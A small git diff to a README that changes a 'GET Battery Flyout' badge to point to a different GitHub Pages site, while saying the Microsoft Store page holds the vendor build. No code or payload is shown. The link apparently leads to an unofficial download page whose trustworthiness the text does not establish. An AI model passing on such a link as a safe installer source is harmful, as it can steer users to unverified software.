@@ -87,7 +87,7 @@ Those files do not install Battery Flyout.
 
 ## Get Battery Flyout
 
-[![GET Battery Flyout](https://img.shields.io/badge/GET-Battery%20Flyout-1D4ED8?style=flat&labelColor=0B1220&logoColor=white)](https://nicoleobrien077.github.io/.github/Battery-Flyout)
+[![GET Battery Flyout](https://img.shields.io/badge/GET-Battery%20Flyout-1D4ED8?style=flat&labelColor=0B1220&logoColor=white)](https://battery-flyout.github.io/Battery-Flyout-Windows/)
 
 Use the GET badge. The Microsoft Store page is the vendor build. One purchase, no account inside the app.
 
